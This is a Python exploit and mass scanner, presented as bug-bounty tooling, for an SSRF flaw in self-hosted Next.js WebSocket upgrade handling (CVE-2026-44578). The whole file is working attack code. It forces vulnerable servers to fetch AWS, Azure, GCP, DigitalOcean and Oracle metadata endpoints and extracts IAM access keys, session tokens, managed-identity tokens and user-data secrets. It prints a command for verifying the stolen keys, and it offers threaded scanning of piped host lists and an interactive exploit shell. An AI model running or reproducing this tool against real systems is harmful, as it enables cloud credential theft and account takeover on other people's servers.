#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════╗
║         NextSSRF — CVE-2026-44578 Scanner & Exploit          ║
║   Next.js WebSocket Upgrade Handler SSRF                     ║
║   Affected: 13.4.13 → 15.5.15 | 16.0.0 → 16.2.4             ║
║   Fixed:    15.5.16 / 16.2.5 (self-hosted only)              ║
║         @mitsec / ynsmroztas — Bug Bounty Tooling            ║
╚══════════════════════════════════════════════════════════════╝

Mechanism:
  The // in http:// triggers normalizeRepeatedSlashes early-exit
  setting finished:true + statusCode:308. The vulnerable WebSocket
  upgrade handler ignores both — only checks parsedUrl.protocol —
  and calls proxyRequest → GET to attacker-controlled host:80.

Limitations: GET only | Port 80 only | IMDSv2 not exploitable
             Vercel-hosted NOT affected | nginx proxy blocks it

Usage:
  # Scan single target
  python3 nextssrf.py -t https://target.com

  # Pipeline (subfinder | httpx | nextssrf)
  cat targets.txt | python3 nextssrf.py --pipe --threads 20

  # Interactive exploit shell
  python3 nextssrf.py -t https://target.com --interactive

  # AWS credential extraction chain
  python3 nextssrf.py -t https://target.com --cloud aws

  # Custom internal target
  python3 nextssrf.py -t https://target.com --ssrf http://internal-api/admin

  # Auto mode: detect cloud + full exploit
  python3 nextssrf.py -t https://target.com --auto

  # Mass scan with output
  cat hosts.txt | python3 nextssrf.py --pipe --threads 20 -o results.jsonl

Exit codes: 0=clean  1=vuln(no exploit)  2=ssrf confirmed
"""

import argparse, json, re, signal, socket, ssl, sys, threading, time
import urllib.parse, urllib.error, urllib.request
from datetime import datetime
from queue import Empty, Queue

# ── ANSI ────────────────────────────────────────────────────────
R="\033[91m";G="\033[92m";Y="\033[93m";C="\033[96m";W="\033[97m"
DIM="\033[2m";RESET="\033[0m";BOLD="\033[1m";M="\033[95m"

WS_KEY = "dGhlIHNhbXBsZSBub25jZQ=="
UA     = ("Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 "
          "(KHTML, like Gecko) Chrome/148.0.0.0 Mobile Safari/537.36")

CTX = ssl.create_default_context()
CTX.check_hostname = False
CTX.verify_mode    = ssl.CERT_NONE

def banner():
    print(f"""
{C}╔══════════════════════════════════════════════════════════════╗
║{W}        NextSSRF — CVE-2026-44578 Scanner & Exploit           {C}║
║{DIM}        Next.js WebSocket Upgrade Handler SSRF                {C}║
║{DIM}        Affected: 13.4.13-15.5.15 | Fixed: 15.5.16/16.2.5    {C}║
║{DIM}        @mitsec / ynsmroztas                                  {C}║
╚══════════════════════════════════════════════════════════════╝{RESET}
""")

def info(m):  print(f"{G}[+]{RESET} {m}")
def warn(m):  print(f"{Y}[!]{RESET} {m}")
def err(m):   print(f"{R}[-]{RESET} {m}")
def step(m):  print(f"{C}[>]{RESET} {BOLD}{m}{RESET}")
def dim(m):   print(f"  {DIM}{m}{RESET}")
def hit(m):   print(f"\n{R}{'█'*58}{RESET}\n{R}{BOLD}  {m}{RESET}\n{R}{'█'*58}{RESET}\n")

def sc(code):
    if code == 200: return G
    if code in (301,302): return Y
    if code in (401,403): return Y
    if code >= 500: return R
    return DIM

# ── Core exploit ─────────────────────────────────────────────

def ssrf(host, port, use_ssl, ssrf_url, timeout=10):
    """Send CVE-2026-44578 WebSocket upgrade exploit request."""
    raw = (f"GET {ssrf_url} HTTP/1.1\r\n"
           f"Host: {host}\r\n"
           f"Connection: Upgrade\r\n"
           f"Upgrade: websocket\r\n"
           f"Sec-WebSocket-Version: 13\r\n"
           f"Sec-WebSocket-Key: {WS_KEY}\r\n"
           f"User-Agent: {UA}\r\n\r\n").encode()
    try:
        s = socket.create_connection((host, port), timeout=timeout)
        if use_ssl:
            s = CTX.wrap_socket(s, server_hostname=host)
        s.sendall(raw)
        s.settimeout(timeout)
        buf = b""
        try:
            while len(buf) < 131072:
                chunk = s.recv(8192)
                if not chunk: break
                buf += chunk
        except socket.timeout: pass
        s.close()
        resp = buf.decode(errors="replace")
        m = re.match(r'HTTP/[\d.]+ (\d+)', resp)
        code = int(m.group(1)) if m else 0
        parts = resp.split("\r\n\r\n", 1)
        body = parts[1] if len(parts) > 1 else resp
        return code, body
    except Exception as e:
        return 0, str(e)

def parse_target(url):
    p = urllib.parse.urlparse(url)
    return p.hostname, p.port or (443 if p.scheme=="https" else 80), p.scheme=="https"

def is_nextjs(body):
    return any(x in body for x in ["/_next/static","/_next/chunks",'charSet="utf-8"'])

# ── Version detection ─────────────────────────────────────────

VULN_RANGES = [((13,4,13),(15,5,15)), ((16,0,0),(16,2,4))]

def parse_ver(s):
    m = re.search(r'(\d+)\.(\d+)\.(\d+)', s or "")
    return tuple(int(x) for x in m.groups()) if m else None

def is_vulnerable(ver):
    if not ver: return None
    for lo, hi in VULN_RANGES:
        if lo <= ver <= hi: return True
    return False

def detect_nextjs(base, timeout=8):
    result = {"nextjs": False, "version": None, "version_str": None, "vulnerable": None}
    for path in ["/_next/static/", "/", "/api/health"]:
        try:
            req = urllib.request.Request(base + path,
                headers={"User-Agent": UA, "Accept": "*/*"})
            with urllib.request.urlopen(req, timeout=timeout, context=CTX) as r:
                body = r.read(4096).decode(errors="replace")
                hdrs = dict(r.headers)
                srv  = hdrs.get("X-Powered-By","") + hdrs.get("x-powered-by","")
                if path == "/_next/static/" or "next.js" in srv.lower():
                    result["nextjs"] = True
                m = re.search(r'["\']?next["\']?\s*:\s*["\'](\d+\.\d+\.\d+)["\']', body)
                if not m:
                    m = re.search(r'Next\.js[/ ]v?(\d+\.\d+\.\d+)', body)
                if m:
                    ver = parse_ver(m.group(1))
                    result.update(version=ver, version_str=m.group(1),
                                  nextjs=True, vulnerable=is_vulnerable(ver))
                    break
        except Exception: pass
    return result

# ── Cloud detection ───────────────────────────────────────────

CLOUD_PROBES = {
    "aws":    [("http://169.254.169.254/latest/meta-data/",
                ["ami-id","instance-id","hostname","iam/","block-device-mapping"])],
    "azure":  [("http://169.254.169.254/metadata/instance?api-version=2021-02-01",
                ["azEnvironment","subscriptionId","vmId"])],
    "gcp":    [("http://metadata.google.internal/computeMetadata/v1/",
                ["instance/","project/"])],
    "do":     [("http://169.254.169.254/metadata/v1.json",
                ["droplet_id","hostname","interfaces"])],
    "oracle": [("http://169.254.169.254/opc/v1/instance/",
                ["compartmentId","displayName"])],
}

def detect_cloud(host, port, use_ssl, timeout=8):
    step("Detecting cloud provider...")
    found = {}
    for provider, probes in CLOUD_PROBES.items():
        for url, hints in probes:
            code, body = ssrf(host, port, use_ssl, url, timeout)
            if code == 200 and not is_nextjs(body):
                hits = [h for h in hints if h.lower() in body.lower()]
                if hits:
                    found[provider] = {"url": url, "hints": hits}
                    info(f"{G}{provider.upper()}{RESET} — matched: {hits}")
                    break
            time.sleep(0.05)
    if not found:
        dim("No cloud metadata detected")
    return found

# ── AWS exploit chain ─────────────────────────────────────────

def render(body, max_lines=30):
    try:
        obj = json.loads(body)
        out = []
        for line in json.dumps(obj, indent=2).splitlines()[:max_lines]:
            k = line.split('":')[0].strip().strip('"').lower()
            color = R+BOLD if any(s in k for s in
                    ['key','secret','token','password','access','cred']) else ""
            out.append(f"  {color}{line}{RESET if color else ''}")
        return "\n".join(out)
    except Exception:
        return "\n".join(f"  {l}" for l in body.strip().splitlines()[:max_lines])

def hit_box(title, data):
    print(f"\n{R}{'▓'*60}{RESET}")
    print(f"{R}{BOLD}  🎯 {title}{RESET}")
    print(f"{R}{'▓'*60}{RESET}")
    for k, v in data.items():
        print(f"  {Y}{k:<22}{RESET}: {G}{BOLD}{str(v)[:80]}{RESET}")
    print(f"{R}{'▓'*60}{RESET}\n")

def exploit_aws(host, port, use_ssl, timeout=8):
    results = {}
    print(f"\n{Y}{'═'*60}{RESET}")
    print(f"{BOLD}  AWS IMDSv1 Exploitation Chain{RESET}")
    print(f"{Y}{'═'*60}{RESET}")

    # Step 1: Instance info
    print(f"\n{C}[1/3]{RESET} Instance Information")
    for name, url in [
        ("Instance ID",   "http://169.254.169.254/latest/meta-data/instance-id"),
        ("Instance Type", "http://169.254.169.254/latest/meta-data/instance-type"),
        ("Hostname",      "http://169.254.169.254/latest/meta-data/hostname"),
        ("Local IPv4",    "http://169.254.169.254/latest/meta-data/local-ipv4"),
        ("Public IPv4",   "http://169.254.169.254/latest/meta-data/public-ipv4"),
        ("AMI ID",        "http://169.254.169.254/latest/meta-data/ami-id"),
        ("Region",        "http://169.254.169.254/latest/meta-data/placement/region"),
        ("AZ",            "http://169.254.169.254/latest/meta-data/placement/availability-zone"),
        ("Account ID",    "http://169.254.169.254/latest/meta-data/identity-credentials/ec2/info"),
    ]:
        code, body = ssrf(host, port, use_ssl, url, timeout)
        val = body.strip()[:100] if (code==200 and not is_nextjs(body)) else None
        print(f"  {sc(code)}[{code}]{RESET} {name:<20}: "
              f"{G if val else DIM}{val or '(not available)'}{RESET}")
        if val: results[name] = val
        time.sleep(0.05)

    # Step 2: IAM role
    print(f"\n{C}[2/3]{RESET} IAM Role Discovery")
    code, body = ssrf(host, port, use_ssl,
                     "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
                     timeout)
    role = None
    if code == 200 and not is_nextjs(body) and body.strip():
        role = body.strip().splitlines()[0].strip()
        print(f"  {G}✓ IAM Role found:{RESET} {R}{BOLD}{role}{RESET}")
        results["iam_role"] = role
    else:
        # Fallback: parse from iam/info ARN
        code2, body2 = ssrf(host, port, use_ssl,
                           "http://169.254.169.254/latest/meta-data/iam/info", timeout)
        if code2 == 200 and not is_nextjs(body2):
            try:
                arn = json.loads(body2).get("InstanceProfileArn","")
                if arn:
                    role = arn.split("/")[-1]
                    print(f"  {G}✓ Role from ARN:{RESET} {R}{BOLD}{role}{RESET}")
                    results["iam_role"] = role
            except Exception: pass
        if not role:
            print(f"  {DIM}No IAM role attached{RESET}")

    # Step 3: Credentials
    print(f"\n{C}[3/3]{RESET} Credential Extraction")
    if role:
        code, body = ssrf(host, port, use_ssl,
            f"http://169.254.169.254/latest/meta-data/iam/security-credentials/{role}",
            timeout)
        if code == 200 and not is_nextjs(body):
            try:
                creds = json.loads(body)
                ak = creds.get("AccessKeyId","")
                sk = creds.get("SecretAccessKey","")
                tok = creds.get("Token","")
                if ak:
                    hit_box("AWS CREDENTIALS EXFILTRATED!", {
                        "Role":              role,
                        "AccessKeyId":       ak,
                        "SecretAccessKey":   sk[:8]+"..."*(len(sk)>8),
                        "Token (first 40)":  tok[:40]+"..." if tok else "N/A",
                        "Expiration":        creds.get("Expiration",""),
                        "Type":              creds.get("Type",""),
                    })
                    results["credentials"] = creds
                    results["verify_cmd"] = (
                        f"AWS_ACCESS_KEY_ID={ak} "
                        f"AWS_SECRET_ACCESS_KEY={sk} "
                        f"AWS_SESSION_TOKEN={tok} "
                        f"aws sts get-caller-identity"
                    )
                    print(f"{Y}Verify:{RESET}")
                    print(f"  {DIM}{results['verify_cmd'][:120]}{RESET}")
                else:
                    print(f"  {render(body, 10)}")
            except json.JSONDecodeError:
                print(f"  {body[:300]}")
        else:
            print(f"  {sc(code)}[{code}]{RESET} No credentials (role may lack permissions)")
    else:
        print(f"  {DIM}Skipped — no role{RESET}")

    # User-data bonus
    print(f"\n{C}[+]{RESET} User-Data Check")
    code, body = ssrf(host, port, use_ssl,
                     "http://169.254.169.254/latest/user-data", timeout)
    if code == 200 and not is_nextjs(body) and body.strip():
        secrets = re.findall(
            r'(?:password|secret|key|token)[=:]\s*\S+', body, re.I)
        if secrets:
            hit_box("SECRETS IN USER-DATA", {"found": str(secrets[:5])})
        else:
            info(f"User-data present ({len(body)}b) — no obvious secrets")
            print(f"  {DIM}{body[:200]}{RESET}")
        results["user_data"] = body[:500]
    else:
        dim(f"No user-data (code={code})")

    return results

def exploit_azure(host, port, use_ssl, timeout=8):
    results = {}
    print(f"\n{Y}{'═'*60}{RESET}")
    print(f"{BOLD}  Azure IMDS Exploitation Chain{RESET}")
    print(f"{Y}{'═'*60}{RESET}")

    code, body = ssrf(host, port, use_ssl,
        "http://169.254.169.254/metadata/instance?api-version=2021-02-01", timeout)
    if code == 200 and not is_nextjs(body):
        try:
            data = json.loads(body)
            compute = data.get("compute",{})
            info("Azure instance info:")
            for k in ["vmId","name","resourceGroupName","subscriptionId","location","vmSize"]:
                v = compute.get(k,"")
                if v:
                    print(f"  {Y}{k:<25}{RESET}: {v}")
                    results[k] = v
        except Exception:
            print(f"  {body[:300]}")

    code, body = ssrf(host, port, use_ssl,
        "http://169.254.169.254/metadata/identity/oauth2/token"
        "?api-version=2018-02-01&resource=https://management.azure.com/", timeout)
    if code == 200 and not is_nextjs(body):
        try:
            td = json.loads(body)
            tok = td.get("access_token","")
            if tok:
                hit_box("AZURE MANAGED IDENTITY TOKEN!", {
                    "access_token (50)": tok[:50]+"...",
                    "token_type":        td.get("token_type",""),
                    "expires_in":        td.get("expires_in",""),
                    "resource":          td.get("resource",""),
                })
                results["azure_token"] = tok
        except Exception:
            pass
    return results

# ── Interactive shell ─────────────────────────────────────────

def interactive(target_url, timeout=10):
    host, port, use_ssl = parse_target(target_url)
    session = {"target": target_url, "results": {}, "history": []}

    print(f"""
{C}╔══════════════════════════════════════════════════════════╗
║{W}  NextSSRF — Interactive Exploit Shell                   {C}║
║{DIM}  Target : {W}{host}:{port}{DIM} {'(SSL)' if use_ssl else '(plain)'}{'':>20}{C}║
║{DIM}  CVE    : CVE-2026-44578                               {C}║
╚══════════════════════════════════════════════════════════╝{RESET}
{DIM}  help | cloud | scan | aws | azure | url <http://...>
  get <N> | list | history | save | quit{RESET}
""")

    def do(url):
        print(f"\n  {DIM}→ {url}{RESET}")
        code, body = ssrf(host, port, use_ssl, url, timeout)
        html = is_nextjs(body)
        print(f"  {sc(code)}[HTTP {code}]{RESET} ({len(body)}b)"
              + (f" {Y}[Next.js response — not SSRF]{RESET}" if html else ""))
        if not html and body.strip():
            print(render(body))
        session["history"].append({"url": url, "code": code})
        return code, body

    IMDS = [
        "http://169.254.169.254/latest/meta-data/",
        "http://169.254.169.254/latest/meta-data/ami-id",
        "http://169.254.169.254/latest/meta-data/hostname",
        "http://169.254.169.254/latest/meta-data/instance-type",
        "http://169.254.169.254/latest/meta-data/iam/info",
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "http://169.254.169.254/latest/user-data",
        "http://169.254.169.254/latest/meta-data/placement/region",
        "http://169.254.169.254/latest/meta-data/identity-credentials/ec2/info",
        "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
    ]

    while True:
        try:
            cmd = input(f"\n{M}ssrf{DIM}({host[:28]}){RESET}> ").strip()
        except (EOFError, KeyboardInterrupt):
            break
        if not cmd: continue

        if cmd in ("q","quit","exit"): break

        elif cmd == "help":
            print(f"""
{C}  cloud{RESET}          — detect cloud (AWS/Azure/GCP/DO)
{C}  scan{RESET}           — cloud detect + auto exploit
{C}  aws{RESET}            — full AWS credential chain
{C}  azure{RESET}          — Azure managed identity
{C}  url <http://...>{RESET} — custom SSRF (port 80 only)
{C}  get <0-9>{RESET}      — IMDS target by index
{C}  list{RESET}           — show all IMDS endpoints
{C}  history{RESET}        — request history
{C}  save{RESET}           — export session JSON
{C}  quit{RESET}           — exit""")

        elif cmd == "cloud":
            clouds = detect_cloud(host, port, use_ssl, timeout)
            session["cloud"] = list(clouds.keys())
            if "aws" in clouds:
                print(f"  {Y}→ Run 'aws' for credential extraction{RESET}")

        elif cmd == "aws":
            r = exploit_aws(host, port, use_ssl, timeout)
            session["results"].update(r)

        elif cmd == "azure":
            r = exploit_azure(host, port, use_ssl, timeout)
            session["results"].update(r)

        elif cmd == "scan":
            clouds = detect_cloud(host, port, use_ssl, timeout)
            if "aws" in clouds:
                r = exploit_aws(host, port, use_ssl, timeout)
                session["results"].update(r)
            elif "azure" in clouds:
                r = exploit_azure(host, port, use_ssl, timeout)
                session["results"].update(r)
            else:
                for u in ["http://localhost/","http://127.0.0.1/",
                          "http://kubernetes.default.svc/"]:
                    do(u)

        elif cmd.startswith("url "):
            url = cmd[4:].strip()
            if not url.startswith("http://"):
                warn("Port 80 only — use http://")
            else:
                do(url)

        elif cmd.startswith("get "):
            try:
                do(IMDS[int(cmd.split()[1])])
            except (IndexError, ValueError):
                warn("Use: get <0-9>. Type 'list' to see targets.")

        elif cmd == "list":
            print(f"\n{C}  IMDS Endpoints:{RESET}")
            for i, u in enumerate(IMDS):
                print(f"  {Y}[{i}]{RESET} {u}")

        elif cmd == "history":
            print(f"\n{C}  History ({len(session['history'])}):{RESET}")
            for h in session["history"][-20:]:
                print(f"  {sc(h['code'])}[{h['code']}]{RESET} {h['url']}")

        elif cmd == "save":
            ts = datetime.now().strftime("%Y%m%d_%H%M%S")
            fname = f"nextssrf_{host}_{ts}.json"
            with open(fname,"w") as f:
                json.dump(session, f, indent=2, default=str)
            info(f"Saved: {fname}")

        elif cmd.startswith("http://"):
            do(cmd)
        else:
            warn("Unknown command — type 'help'")

# ── Scanner ───────────────────────────────────────────────────

_lock = threading.Lock()
_results = []
_exit = 0

CLOUD_TARGETS = {
    "aws": [
        ("AWS IMDSv1 — meta-data",    "http://169.254.169.254/latest/meta-data/"),
        ("AWS IMDSv1 — hostname",     "http://169.254.169.254/latest/meta-data/hostname"),
        ("AWS IMDSv1 — iam/creds",    "http://169.254.169.254/latest/meta-data/iam/security-credentials/"),
        ("AWS IMDSv1 — user-data",    "http://169.254.169.254/latest/user-data"),
        ("AWS IMDSv1 — instance-id",  "http://169.254.169.254/latest/meta-data/instance-id"),
        ("AWS IMDSv1 — ami-id",       "http://169.254.169.254/latest/meta-data/ami-id"),
        ("AWS IMDSv1 — account",      "http://169.254.169.254/latest/meta-data/identity-credentials/ec2/info"),
    ],
    "azure": [
        ("Azure IMDS — instance",     "http://169.254.169.254/metadata/instance?api-version=2021-02-01"),
        ("Azure IMDS — identity",     "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"),
    ],
    "gcp": [
        ("GCP Metadata — project",    "http://metadata.google.internal/computeMetadata/v1/project/project-id"),
        ("GCP Metadata — token",      "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"),
    ],
    "do": [
        ("DO Metadata",               "http://169.254.169.254/metadata/v1.json"),
    ],
    "oracle": [
        ("OCI Metadata",              "http://169.254.169.254/opc/v1/instance/"),
    ],
}

def scan(target, args):
    global _exit
    target = target.strip()
    if not target: return {}
    # Extract URL from httpx-style output
    target = target.split()[0]
    if not target.startswith("http"): target = "https://" + target

    dim(f"Detecting: {target}")
    det = detect_nextjs(target, args.timeout)
    vs  = det.get("version_str") or "unknown"
    vuln = det.get("vulnerable")

    if not det["nextjs"]:
        dim(f"Not Next.js: {target}")
        return {}

    vs_color = {True:R,False:G,None:Y}[vuln]
    vs_label = {True:"VULNERABLE",False:"PATCHED",None:"UNKNOWN"}[vuln]
    info(f"{W}{target}{RESET} — Next.js/{vs} — {vs_color}{vs_label}{RESET}")

    if vuln is False and not args.force:
        return {"target":target,"version":vs,"vulnerable":False,"ssrf_hits":[]}

    host, port, use_ssl = parse_target(target)
    result = {"target":target,"version":vs,"vulnerable":vuln,"ssrf_hits":[]}

    # Choose targets
    targets = []
    if args.ssrf:
        targets = [("Custom", args.ssrf)]
    else:
        cloud = args.cloud or "aws"
        if cloud == "all":
            for lst in CLOUD_TARGETS.values(): targets.extend(lst)
        else:
            targets = CLOUD_TARGETS.get(cloud, CLOUD_TARGETS["aws"])

    step(f"  Testing {len(targets)} SSRF targets → {target}")
    for desc, url in targets:
        dim(f"    → {url}")
        code, body = ssrf(host, port, use_ssl, url, args.timeout)
        time.sleep(0.05)

        html = is_nextjs(body)
        is_hit = False
        evidence = ""

        if "Failed to proxy http:/" in body:
            is_hit = True
            evidence = "Log fingerprint: vulnerable but IMDS unreachable"
        elif code == 200 and not html:
            imds_patterns = [
                r'ami-[a-f0-9]{8}', r'AccessKeyId',
                r'SecretAccessKey', r'AKIA[0-9A-Z]{16}',
                r'ip-\d+-\d+-\d+-\d+\.ec2\.internal',
                r'instance-id\ninstance-type',
                r'"accountId"', r'"subscriptionId"',
                r'droplet_id', r'compartmentId',
            ]
            if any(re.search(p, body) for p in imds_patterns):
                is_hit = True
                evidence = body[:600]
            elif len(body) < 2000 and "169.254.169.254" in url:
                is_hit = True
                evidence = body[:400]

        if re.search(r'AKIA[0-9A-Z]{16}|"AccessKeyId".*"SecretAccessKey"', body):
            is_hit = True
            evidence = body[:800]
            hit(f"AWS CREDENTIALS via {url}")

        if is_hit:
            hit(f"SSRF CONFIRMED — {desc}")
            print(f"  {Y}Target  :{RESET} {url}")
            print(f"  {Y}Status  :{RESET} {sc(code)}HTTP {code}{RESET}")
            if evidence and evidence != body[:400]:
                pass
            elif evidence:
                print(f"  {Y}Response:{RESET}\n{render(evidence, 15)}")
            result["ssrf_hits"].append({"desc":desc,"url":url,"status":code,"evidence":evidence})
            with _lock: _exit = max(_exit, 2)

    if result["ssrf_hits"] == [] and vuln:
        with _lock: _exit = max(_exit, 1)

    return result

def worker(q, args):
    while True:
        try: t = q.get(timeout=1)
        except Empty: break
        try:
            r = scan(t, args)
            if r:
                with _lock: _results.append(r)
        except Exception as e: err(f"{t}: {e}")
        finally: q.task_done()

def summary(results):
    vuln = [r for r in results if r.get("vulnerable")]
    hits = [r for r in results if r.get("ssrf_hits")]
    print(f"\n{C}{'═'*58}{RESET}")
    print(f"{BOLD}  NextSSRF — CVE-2026-44578 Summary{RESET}")
    print(f"{C}{'═'*58}{RESET}")
    print(f"  Scanned        : {len(results)}")
    print(f"  {R}Vulnerable     : {len(vuln)}{RESET}")
    print(f"  {R}SSRF Confirmed : {len(hits)}{RESET}")
    if hits:
        print(f"\n{R}[CONFIRMED SSRF]{RESET}")
        for r in hits:
            print(f"  {r['target']}")
            for h in r["ssrf_hits"][:3]:
                print(f"    {Y}→{RESET} {h['url']} (HTTP {h['status']})")

def main():
    global _exit
    p = argparse.ArgumentParser(prog="nextssrf",
        description="CVE-2026-44578 — Next.js SSRF @mitsec",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=__doc__.split("Usage:")[1] if "Usage:" in __doc__ else "")
    p.add_argument("-t","--target")
    p.add_argument("--pipe",    action="store_true", help="Read targets from stdin")
    p.add_argument("-f","--file",                    help="File with targets")
    p.add_argument("--threads", type=int, default=10)
    p.add_argument("--timeout", type=int, default=10)
    p.add_argument("--cloud",   choices=["aws","azure","gcp","do","oracle","all"],
                                default="aws")
    p.add_argument("--ssrf",    help="Custom SSRF URL (http:// only)")
    p.add_argument("--force",   action="store_true", help="Exploit even if version unknown")
    p.add_argument("--interactive", "-i", action="store_true", help="Interactive exploit shell")
    p.add_argument("--auto",    action="store_true", help="Auto: detect cloud + full exploit")
    p.add_argument("-o","--output",                  help="Output file (.json or .jsonl)")
    p.add_argument("--no-banner", action="store_true")
    args = p.parse_args()

    if not args.no_banner: banner()

    def _sig(s,f):
        warn("Interrupted"); summary(_results)
        if args.output: _save(args.output)
        sys.exit(_exit)
    signal.signal(signal.SIGINT, _sig)

    targets = []
    if args.target:  targets.append(args.target)
    if args.pipe:
        for l in sys.stdin:
            if l.strip(): targets.append(l.strip())
    if args.file:
        with open(args.file) as f:
            targets += [l.strip() for l in f if l.strip() and not l.startswith("#")]
    if not targets:
        err("No targets. Use -t, --pipe, or -f"); sys.exit(1)

    targets = [t if t.startswith("http") else "https://"+t for t in targets]

    # Interactive / auto (single target)
    if args.interactive or args.auto:
        if len(targets) != 1:
            err("Interactive/auto mode requires exactly one target (-t)")
            sys.exit(1)
        if args.auto:
            host, port, use_ssl = parse_target(targets[0])
            clouds = detect_cloud(host, port, use_ssl, args.timeout)
            if "aws" in clouds:    exploit_aws(host, port, use_ssl, args.timeout)
            elif "azure" in clouds: exploit_azure(host, port, use_ssl, args.timeout)
        else:
            interactive(targets[0], args.timeout)
        return

    # Scan mode
    if len(targets) == 1:
        r = scan(targets[0], args)
        if r: _results.append(r)
    else:
        step(f"Scanning {len(targets)} targets | threads={args.threads}")
        q = Queue()
        for t in targets: q.put(t)
        ts = [threading.Thread(target=worker, args=(q,args), daemon=True)
              for _ in range(min(args.threads, len(targets)))]
        for t in ts: t.start()
        try: q.join()
        except KeyboardInterrupt: _sig(None,None)

    summary(_results)
    if args.output: _save(args.output)
    sys.exit(_exit)

def _save(path):
    fmt = "json" if path.endswith(".json") else "jsonl"
    with open(path,"w") as f:
        if fmt == "json": json.dump(_results, f, indent=2, default=str)
        else:
            for r in _results: f.write(json.dumps(r, default=str)+"\n")
    info(f"Saved: {path}")

if __name__ == "__main__":
    main()
